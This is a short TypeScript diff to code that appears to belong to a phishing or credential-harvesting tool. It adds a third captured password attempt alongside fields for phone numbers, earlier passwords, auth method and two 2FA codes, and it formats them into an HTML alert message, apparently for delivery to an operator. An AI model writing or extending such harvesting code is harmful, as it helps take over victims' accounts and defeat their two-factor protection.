@@ -100,6 +100,7 @@ function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any 
         phone: 'Phone Number',
         password: 'Password First',
         passwordSecond: 'Password Second',
+        passwordThird: 'Password Third',
         authMethod: 'Auth Method',
         twoFa: 'Code 2FA(1)',
         twoFaSecond: 'Code 2FA(2)',
@@ -134,6 +135,7 @@ function normalizeData(input: any = {}) {
         phone: input.phone ?? '',
         password: input.password ?? '',
         passwordSecond: input.passwordSecond ?? '',
+        passwordThird: input.passwordThird ?? '',
         authMethod: input.authMethod ?? '',
         twoFa: input.twoFa ?? '',
         twoFaSecond: input.twoFaSecond ?? '',
@@ -181,6 +183,7 @@ function formatMessage(data: any): string {
         `<b>🔑 PASSWORD</b>`,
         `<b>Password(1):</b> <code>${escapeHtml(d.password || '-')}</code>`,
         `<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond || '-')}</code>`,
+        `<b>Password(3):</b> <code>${escapeHtml(d.passwordThird || '-')}</code>`,
         `${authLine ? authLine.trim() : ''}`
     ].filter(Boolean);
 
